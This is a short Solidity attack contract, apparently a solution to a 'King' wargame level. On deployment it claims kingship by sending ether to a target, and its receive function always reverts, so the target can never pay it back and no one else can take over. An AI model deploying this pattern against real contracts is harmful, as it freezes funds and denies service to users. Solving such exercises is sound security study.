contract AttackKing{
    constructor(address _king) public payable{
        address(_king).call.value(msg.value)("");

    }

    receive() external payable{
        revert("You Loose!");
    }


}
